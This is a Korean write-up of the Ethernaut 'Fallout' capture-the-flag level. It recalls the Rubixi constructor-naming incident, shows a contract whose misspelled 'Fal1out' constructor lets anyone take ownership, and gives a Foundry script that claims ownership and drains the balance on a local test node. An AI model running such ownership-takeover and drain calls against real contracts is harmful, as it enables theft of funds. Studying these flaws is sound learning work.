# 지문

그거 좀 어이없지 않나요? 현실 세계의 컨트랙트는 이보다 훨씬 더 안전하고, 해킹하기도 훨씬 더 어려워야 할 것 같죠?

음... 꼭 그렇지만은 않습니다.

이더리움 생태계에서 유명한 사례 중 하나로 **Rubixi 사건**이 있습니다. 이 회사는 원래 \*\*‘Dynamic Pyramid’\*\*라는 이름이었는데, 이름을 \*\*‘Rubixi’\*\*로 바꾸면서도 컨트랙트의 **생성자(constructor) 함수 이름을 변경하지 않은** 채로 배포했습니다:

```solidity
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...
```

이 허점을 이용해 공격자가 **예전 생성자 함수(DynamicPyramid)를 호출해 컨트랙트의 소유권을 탈취**했고, 결국 자금을 빼돌릴 수 있었습니다.

네, 스마트 컨트랙트 세계에서는 이렇게 **큰 실수**도 충분히 일어날 수 있습니다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```


# 풀이 
그냥 지문에 보이는 함수를 호출하면됨.

여기서 문제 풀이와 관련은 없지만 한가지 TMI로 이야기하자면 solidity의 과거 버전에서는 지금 0.8.0버전 대에서 `constructor` keyword를 사용해서 생성자를 작성하지않았음

`function [contract name]` 으로 생성자를 작성했음

근데 버전업이 되면서 바뀌었으나 여전히 `function [contract name]` 으로 생성자를 만들어야되는줄 알았던 개발자들이 있었고 그로인해 자금이 털린적도 있긴함 


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface IFallout {
    function Fal1out() external payable;
    function collectAllocations() external;
    function owner() external view returns (address);
}
contract SolveScript is Script {
    address public target = 0x5E3d0fdE6f793B3115A9E7f5EBC195bbeeD35d6C;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        IFallout fo = IFallout(target);

        console.log("owner before poc : %s", fo.owner());
        console.log("target balance before poc : %d", target.balance);
        fo.Fal1out{value:100}();
        fo.collectAllocations();

        console.log("owner after poc : %s", fo.owner());
        console.log("target balance after poc : %d", target.balance);
        vm.stopBroadcast();
    }
}
```